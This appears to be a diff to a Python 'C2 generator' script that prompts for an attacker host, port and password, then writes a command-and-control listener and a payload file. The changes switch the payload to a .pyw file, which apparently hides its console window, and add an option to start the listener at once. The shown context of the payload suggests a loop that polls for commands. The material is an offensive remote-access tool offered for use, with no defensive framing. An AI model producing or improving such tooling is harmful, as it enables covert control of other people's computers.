@@ -1,25 +1,38 @@
-import pyfiglet
 import time
 import random
 import string
+import socket
+import subprocess
+import pyfiglet
 
 ascii_banner = pyfiglet.figlet_format("CODENAME C2: Generator")
 print(ascii_banner)
 
-filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 3))
+def IPv4():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.settimeout(0)
+    try:
+        s.connect(('10.254.254.254', 1))
+        IP = s.getsockname()[0]
+    except Exception:
+        IP = '127.0.0.1'
+    finally:
+        s.close()
+    return IP
 
-LHOST = str(input(">>> LHOST: "))
+print(f"[?] Your IPv4: {IPv4()}")
 print()
-LPORT = int(input(">>> LPORT: "))
+LHOST = str(input("[+] Enter LHOST: "))
+print()
+LPORT = int(input("[+] Enter LPORT: "))
 print()
 Domain = f"http://{LHOST}:{LPORT}"
-print(f">>> Domain: {Domain}")
+print(f"[-] Domain: {Domain}")
 print()
-Key = str(input(">>> Create Password to Encrypt & Decrypt signals: "))
+Key = str(input("[+] Create Password to Encrypt & Decrypt signals: "))
 print()
 print(">>> Generating ...")
-time.sleep(2)
-
+time.sleep(0.5)
 
 Listener = f'''
 from http.server import BaseHTTPRequestHandler, HTTPServer
@@ -31,6 +44,8 @@ print(ascii_banner)
 
 LHOST = "{LHOST}"
 LPORT = {LPORT}
+print("[-] Listening ...")
+print()
 
 class Server_Filter(BaseHTTPRequestHandler):
     
@@ -56,7 +71,7 @@ if __name__ == '__main__':
         Server_Characteristic.serve_forever()
     except KeyboardInterrupt:
         print('[-] Server Closed')
-
+        print()
 '''
 
 Payload = f'''
@@ -78,14 +93,29 @@ while True:
     cmd = "Error"          
 '''
 
-with open(f"Listener_{filename}.py","a") as file:
-        file.write(Listener)
-        
-print()
-print(f">>> 'Listener_{filename}.py' is generated")
+filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 3))
 
-with open(f"Payload_{filename}.py","a") as file:
-        file.write(Payload)
-        
+with open(f"Listener_{filename}.py","a") as file:
+        file.write(Listener)        
 print()
-print(f">>> 'Payload_{filename}.py' is generated")
+print(f"[-] 'Listener_{filename}.py' is generated")
+
+time.sleep(0.5)
+
+with open(f"Payload_{filename}.pyw","a") as file:
+        file.write(Payload)
+print()
+print(f"[-] 'Payload_{filename}.pyw' is generated")
+print()
+time.sleep(0.5)
+
+Listening_optional = str(input("[+] Wanna active listening mode now ? (y/n): "))
+try:
+    if Listening_optional == "yes" or Listening_optional == "Yes" or Listening_optional == "Y" or Listening_optional == "y": 
+        time.sleep(0.5)
+        subprocess.call(f"python3 Listener_{filename}.py", shell = True)
+    else:
+        print("[-] Closed!")     
+except KeyboardInterrupt:
+    print('[-] Terminated!\n')
+ 
